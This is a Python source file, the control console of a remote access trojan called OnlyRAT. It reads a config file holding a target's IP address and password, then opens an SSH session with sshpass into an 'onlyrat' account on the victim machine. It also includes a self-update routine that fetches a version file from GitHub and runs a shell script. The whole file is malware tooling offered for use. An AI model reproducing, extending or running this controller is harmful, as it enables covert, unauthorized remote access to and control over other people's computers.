#!/usr/bin/python
# python console for OnlyRAT
# created by : C0SM0

# imports
import os
import sys
import getpass
from modules import *

# variables
banner = """
     ::::::::  ::::    ::: :::     :::   ::: :::::::::      ::: ::::::::::: 
    :+:    :+: :+:+:   :+: :+:     :+:   :+: :+:    :+:   :+: :+:   :+:      
   +:+    +:+ :+:+:+  +:+ +:+      +:+ +:+  +:+    +:+  +:+   +:+  +:+       
  +#+    +:+ +#+ +:+ +#+ +#+       +#++:   +#++:++#:  +#++:++#++: +#+        
 +#+    +#+ +#+  +#+#+# +#+        +#+    +#+    +#+ +#+     +#+ +#+         
#+#    #+# #+#   #+#+# #+#        #+#    #+#    #+# #+#     #+# #+#          
########  ###    #### ########## ###    ###    ### ###     ### ###  

            [::] The Only RAT You'll Ever Need [::]
                [::] Created By : Blue Cosmo [::]
"""

help_menu = """
        [+] Arguments:
            XXX.rat = configuration file 

        [+] Example:
            python3 main.py bluecosmo.rat
"""

options_menu = """
        [+] Payloads:
            [0] - Remote Console

        [+] Options:
            [u] - Update
            [q] - Quit

        [+] Select an [option]

"""

username = getpass.getuser()
header = f"[~] {username}@onlyrat $ "
remote_path = "raw.githubusercontent.com/CosmodiumCS/OnlyRAT/main/"

# read config file
def read_config(config_file):
    configuration = {}

    # get file contents
    read_lines = open(config_file, "r").readlines()

    # get target configurations
    configuration["IPADDRESS"] = read_lines[0].strip()
    configuration["PASSWORD"] = read_lines[1].strip()
    configuration["WORKINGDIRECTORY"] = read_lines[2].strip()

    return configuration

# clear screen
def clear():
    os.system("clear")

# terminates program
def exit():
    print("\n[*] Exiting...")
    sys.exit()

# connects rat to target
def connect(address, password):
    # remotely connect
    os.system(f"sshpass -p \"{password}\" ssh onlyrat@{address}")

# update OnlyRAT
def update():

    print("\n[*] Checking for updates...")

    # get latest version nubmer
    os.system(f"curl https://raw.githubusercontent.com/CosmodiumCS/OnlyRAT/main/version.txt | tee latest.txt")

    # save version nubmers to memory
    current_version = float(open("version.txt", "r").read())
    latest_version = float(open("latest.txt", "r").read())

    # remove version number file
    os.system("rm -rf latest.txt")

    # if new version is available, update
    if latest_version > current_version:
        print("\n[+] Update found")
        print("[*] Update Onlyrat? [y/n]\n")

        # user input, option
        option = input(f"{header}")
        
        # update
        if option == "y":
            os.system("mv payloads/update.sh ..")
            os.system("cd .. && chmod +x update.sh && ./update.sh")
        
        # exception
        else:
            main()

    # otherwise, run main code
    else:
        print("\n[+] OnlyRAT already up to date")
        print("[*] Hit any key to continue...\n")
        input(header)
        main()

# command line interface
def cli(arguments):
    # display banner
    clear()
    print(banner)

    # if arguments exist
    if arguments:
        # display options
        print(options_menu)

        # user input, option
        option = input(header)

        try:
            configuration = read_config(sys.argv[1])
    
        except FileNotFoundError: 
            print("\n[!!] File does not exist")
            exit()

        # get config info
        ipv4 = configuration.get("IPADDRESS")
        password = configuration.get("PASSWORD")
        working_direcory = configuration.get("WORKINGDIRECTORY")

        # remote console
        if option == "0":
            connect(ipv4, password)        
        
        # update option
        if option == "u" or option == "update":
            update()

        # quit option
        if option == "q" or option == "quit" or option == "exit":
            exit()

    # if arguments don't exist
    else:
        print(help_menu)

# main code
def main():
    # clear screen
    clear()

    # checks for arguments
    try:
        sys.argv[1]
    except IndexError:
        arguments_exist = False
    else:
        arguments_exist = True

    # run command line interface
    cli(arguments_exist)

# runs main code
if __name__ == "__main__":
    main()